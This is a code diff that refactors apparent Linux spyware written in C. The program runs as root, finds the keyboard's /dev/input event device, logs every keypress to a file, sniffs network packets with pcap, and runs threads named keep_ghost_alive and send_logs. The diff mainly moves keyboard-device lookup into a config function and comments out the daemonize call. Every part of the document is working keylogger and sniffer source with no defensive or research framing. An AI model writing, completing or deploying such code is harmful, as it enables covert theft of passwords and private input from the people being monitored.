@@ -19,6 +19,7 @@
 #include "key_util.h"
 #include "util.h"
 #include "server_client.h"
+#include "config.h"
 
 #include "ip.h"
 #include "http.h"
@@ -40,6 +41,7 @@ void* keep_ghost_alive(void *args);
 void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_char *packet);
 void* start_keylogging(void *args);
 void* send_logs();
+struct Config retrive_keyboard_file();
 
 int main(int argc, char **argv)
 {
@@ -47,6 +49,8 @@ int main(int argc, char **argv)
     if (argc >= 2)
         id = atoi(argv[1]);
 
+    Config config = retrive_keyboard_file();
+    
     pthread_attr_t attr;
     pthread_attr_init(&attr);
 
@@ -54,14 +58,18 @@ int main(int argc, char **argv)
     pthread_create(&aliver, &attr, keep_ghost_alive, &id);
     
     pthread_t keylog;
-    pthread_create(&keylog, &attr, start_keylogging, &id);
+    pthread_create(&keylog, &attr, start_keylogging, &config);
     
     pthread_t sendlogs;
-    pthread_create(&sendlogs, &attr, send_logs, &id);
+    pthread_create(&sendlogs, &attr, send_logs, NULL);
 
     FILE *network_log = fopen("log/network.txt", "a");
     struct loginfo info = { network_log, NEVER_WRITTEN, 4 };
 
+    FILE *keylog_log = fopen("log/keylog.txt", "a");
+    config.keylog_log = keylog_log;
+    setbuf(keylog_log, NULL);  //Disable buffering to write on every KEY_PRESS
+    
     /* Variables for pcap sniffing, such as error buffer, device to be read
        and filters, masks, etc. */
     char *dev, errbuf[100];
@@ -70,6 +78,12 @@ int main(int argc, char **argv)
     bpf_u_int32 mask;
     bpf_u_int32 net;
 
+    /*Check for root privileges*/
+    if (geteuid() != 0) {
+        printf("Must run as root! Exiting... \n");
+        exit(1);
+    }
+    
     /* Create the default pcap device and exit if error occurs */
     dev = pcap_lookupdev(errbuf);
     if (dev == NULL)
@@ -106,62 +120,16 @@ int main(int argc, char **argv)
         printf("Couldn't install filter: %s. Exiting...", pcap_geterr(handle));
         exit(1);
     }
-
-    /***KEYLOGGER****/
-    /*Check for root privileges*/
-    if (geteuid() != 0) {
-        printf("Must run as root! Exiting... \n");
-        exit(-1);
-    }
-    
-    /*Retrieve keyboard device file*/
-    static const char *command =
-    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
-    "grep -B1 120013 |"
-    "grep -Eo event[0-9]+ |"
-    "tr '\\n' '\\0'";
-    
-    FILE *pipe = popen(command, "r");
-    if (pipe == NULL) {
-        printf("Could not determine keyboard device file \nExiting...");
-        exit(-1);
-    }
-    char result[20] = "/dev/input/";
-    char temp[9];
-    fgets(temp, 9, pipe);
-    pclose(pipe);
-    char *device_file;
-    device_file = strcat(result, temp);
-    
-    /*Open keyboard device file*/
-    int kb_fd = open(device_file, O_RDONLY);
-    if (kb_fd == -1) {
-        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
-        exit(-1);
-    }
-
-    
-    /*Open log file*/
-    FILE *log_file = fopen("log/keylog.txt", "a");
-    if (log_file == NULL) {
-        printf("Could not open log file. \nExiting...");
-        exit(-1);
-    }
-    
-    /*Disable buffering to write on every KEY_PRESS*/
-    setbuf(log_file, NULL);
     
     pcap_loop(handle, -1, packet_received, (u_char*) &info);
-    
 
-    close(kb_fd);
     pcap_freecode(&filter);
     pcap_close(handle);
     pthread_join(aliver, NULL);
     pthread_join(keylog, NULL);
     pthread_join(sendlogs, NULL);
     fclose(network_log);
-    fclose(log_file);
+    fclose(keylog_log);
 
     return 0;
 }
@@ -222,25 +190,52 @@ void packet_received(u_char *args, const struct pcap_pkthdr *header, const u_cha
         }
 }
 
+struct Config retrive_keyboard_file()
+{
+    /*retrieve keyboard device file*/
+    Config config;
+    static const char *command =
+    "grep -E 'Handlers|EV' /proc/bus/input/devices |"
+    "grep -B1 120013 |"
+    "grep -Eo event[0-9]+ |"
+    "tr '\\n' '\\0'";
+    
+    FILE *pipe = popen(command, "r");
+    if (pipe == NULL) {
+        printf("Could not determine keyboard device file \nExiting...");
+        exit(-1);
+    }
+    char result[20] = "/dev/input/";
+    char temp[9];
+    fgets(temp, 9, pipe);
+    pclose(pipe);
+    config.device_file = strcat(result, temp);
+    
+    /*Open keyboard device file*/
+    int kb_fd = open(config.device_file, O_RDONLY);
+    if (kb_fd == -1) {
+        printf("Could not open keyboard device file. \nError: %s.  \nExiting...", strerror(errno));
+        exit(-1);
+    }
+    config.kb_fd = (int)kb_fd;
+    return config;
+
+}
+
 void* start_keylogging(void *args)
 {
     typedef struct input_event input_event;
     input_event event;
     int shift_pressed=0; //If shift engaged, shift_pressed = 1
-    FILE *log_file = args;
-    int kb_fd = *((int *) args);
-    
+
+    Config *config = args;
+
     /*Use struct for timestamped_write*/
-    struct loginfo *info = (struct loginfo*) args;
-    info->file = log_file;
+    FILE *keylog_filename = config->keylog_log;
+
+   // daemon(1, 0);
     
-    /*Daemonize process by redirecting stdin and stdout to /dev/null*/
-    if (daemon(1, 0) == -1) {
-        printf("Could not daemonize. \nError: %s. \nExiting...", strerror(errno));
-        exit(-1);
-    }
-    
-    while (read(kb_fd, &event, sizeof(input_event)) > 0){
+    while (read(config->kb_fd, &event, sizeof(input_event)) > 0){
         if (event.type == EV_KEY) {
             if (event.value == KEY_PRESS) {
                 if (is_shift(event.code)) {
@@ -248,8 +243,10 @@ void* start_keylogging(void *args)
                 }
                 char *name = get_key_text(event.code, shift_pressed);
                 if (strcmp(name, "\0") != 0) {
-                    timestamped_write(info, name);
-                    timestamped_write(info, "\n");
+                    fprintf(keylog_filename, "%s", name);
+                    /*
+                   timestamped_write(keylog_info, name);
+                   timestamped_write(keylog_info, "\n"); */
                 }
             } else if (event.value == KEY_RELEASE) {
                 if (is_shift(event.code)) {
